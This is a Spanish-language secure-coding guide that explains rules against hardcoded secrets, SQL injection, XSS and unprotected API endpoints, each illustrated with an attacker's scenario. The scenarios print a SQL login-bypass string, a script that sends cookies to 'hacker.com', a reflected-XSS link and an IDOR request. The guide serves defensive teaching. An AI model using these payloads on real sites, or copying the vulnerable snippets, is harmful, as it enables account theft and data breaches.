# Explicación de las Directrices de Seguridad VibeCoding: ¿Por Qué Insistimos Tanto?

Este documento explica la importancia de cada regla en las "Directrices de Seguridad". Entender esto te ayudará a ver tu código desde la "perspectiva de un hacker" y prevenir problemas antes de que ocurran.

---

## ⭐ Reglas de Oro

### 【Nunca hardcodear secretos】 & 【Usar variables de entorno】 & 【Ignorar archivos secretos】

**¿Por qué es importante?**

Estas tres reglas son las leyes supremas de supervivencia del mundo digital. Tu código (especialmente al usar Git) será copiado, compartido y almacenado en múltiples lugares. Escribir contraseñas, claves API y otros "secretos" directamente en el código es como tatuarse la contraseña de la caja fuerte en la frente - cualquiera que te vea (vea el código) puede abrir fácilmente tu caja fuerte.

**Escenario del Hacker 😈**
> Me encanta buscar `password`, `api_key` o `db_connect` en GitHub. Encontré tu proyecto público y en un archivo llamado `config.js` vi este código: `const db_password = 'Password123!';`. ¡Perfecto! Ni siquiera necesito atacar tu sitio - ahora puedo intentar conectarme directamente a tu base de datos con esta contraseña.

**Consecuencias Catastróficas 💥**

**Control completo del servicio.** Los hackers pueden robar, alterar, eliminar todos los datos de tus usuarios, o usar tus servicios API de pago para actividades ilegales, con todas las facturas a tu nombre.

---

## 📥 Manejo de Entrada del Usuario

### 【Prevenir Ataques de Inyección SQL】

**¿Por qué es importante?**

Imagina la base de datos como un robot que solo entiende el lenguaje SQL. Si concatenas directamente la entrada del usuario con tus comandos, los usuarios tienen la oportunidad de pronunciar sus propios "comandos". Las consultas parametrizadas le dicen al robot: "Escucha, la siguiente parte son **solo datos** - sin importar el contenido, no los ejecutes como comandos."

**Escenario del Hacker 😈**
> En el campo de login de tu sitio, ingresé `' OR '1'='1' --` como nombre de usuario. Asumo que tu consulta SQL está escrita así: `"SELECT * FROM users WHERE username = '" + userInput + "';`. Mi entrada la transformó en `SELECT * FROM users WHERE username = '' OR '1'='1' --';`. `'1'='1'` siempre es verdadero, así que he eludido la verificación de contraseña y me he logueado exitosamente en la primera cuenta de usuario (usualmente el administrador).

**Consecuencias Catastróficas 💥**

Los atacantes pueden eludir el login, robar todos los datos de la base de datos (listas de usuarios, hashes de contraseñas), o incluso eliminar la base de datos.

### 【Prevenir Ataques de Secuencias de Comandos entre Sitios (XSS)】

**¿Por qué es importante?**

Si tu sitio web es como un espejo que refleja directamente el contenido de entrada del usuario, entonces los usuarios pueden incrustar scripts JavaScript maliciosos en el contenido. Cuando otros usuarios navegan por este contenido, el script malicioso se ejecutará en sus navegadores, robando su información. La codificación de entidades HTML convierte caracteres especiales en scripts maliciosos (como `<`, `>`) en texto plano inofensivo, haciéndolos no ejecutables.

**Escenario del Hacker 😈**
> Dejé un comentario en la sección de comentarios de tu artículo: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Este texto fue almacenado en la base de datos tal como está. Ahora cualquier usuario que lea este comentario tendrá su navegador ejecutando automáticamente este script, enviando sus cookies de login a mi servidor. Con las cookies, puedo suplantar su identidad para iniciar sesión en el sitio web.

**Método de Ataque Avanzado: ¿Cómo Puede el Código del Usuario A Robar los Datos del Usuario B?**

Muchas personas se preguntan: "El atacante no modificó mi sitio web, entonces ¿cómo puede robar los datos de otros usuarios?" Déjame explicarlo con un ejemplo completo:

1. **El atacante A crea un enlace malicioso**
   ```
   https://yoursite.com/detail.php?id=1<script>steal()</script>
   ```

2. **El atacante engaña a la víctima B a través de ingeniería social**
   - Email: "¡Mira el trabajo fantástico de este fotógrafo!"
   - Publicaciones en redes sociales, comentarios en foros, etc.

3. **¿Qué pasa cuando la víctima B hace clic en el enlace?**
   ```php
   // Tu código (vulnerable)
   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
   
   // Salida real al navegador de B
   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
   ```

4. **¿Por qué pueden robar los datos de B?**
   - B ya está autenticado en tu sitio web
   - El script malicioso se ejecuta bajo **tu dominio**, por lo que puede:
     - Leer las cookies de B (credenciales de login)
     - Acceder al localStorage de B
     - Hacer solicitudes en nombre de B
     - Modificar el contenido de la página (ej: formularios de login falsos)

**Analogía Simple**
Imagina que tu sitio web es un banco:
- El atacante A coloca un "recibo de retiro falso" (script malicioso) en el vestíbulo del banco
- El cliente B piensa que es legítimo e ingresa su contraseña
- A obtiene la contraseña de B

XSS permite a los atacantes colocar "recibos de retiro falsos" (código malicioso) en tu "vestíbulo del banco" (sitio web).

Por eso debes usar `htmlspecialchars()` - garantiza que toda entrada del usuario se muestre como texto plano, no como código ejecutable.

**Consecuencias Catastróficas 💥**

Robo masivo de cuentas de usuario, fuga de datos personales, sitios web infiltrados con contenido de phishing o scripts de minería.

---

## 🔐 Permisos y Autenticación

### 【Protección de Endpoints API】

**¿Por qué es importante?**

Las interfaces frontend (UI) pueden ocultar botones, pero los hackers nunca confían en las interfaces. Llaman directamente a tus APIs backend con herramientas (como Postman, curl). Debes asumir que cada endpoint API será atacado directamente, por lo que cada endpoint debe ser un guardia independiente, verificando por sí mismo la identidad y permisos de los visitantes.

**Escenario del Hacker 😈**
> Descubrí que para modificar información personal, el frontend envía una solicitud a `/api/user/update`. Aunque no puedo ver los botones de edición de otras personas, asumo que esta API distingue usuarios a través de `userId`. Intenté enviar una solicitud a `/api/user/update?userId=1` (ID del administrador) con los datos que quería modificar. ¡Dios mío, el servidor no verificó si la solicitud venía de mí personalmente y cambió exitosamente el email del administrador!

**Consecuencias Catastróficas 💥**

Usuarios ordinarios pueden alterar datos de otros usuarios o incluso administradores, o ejecutar permisos que no deberían tener, causando caos sistémico.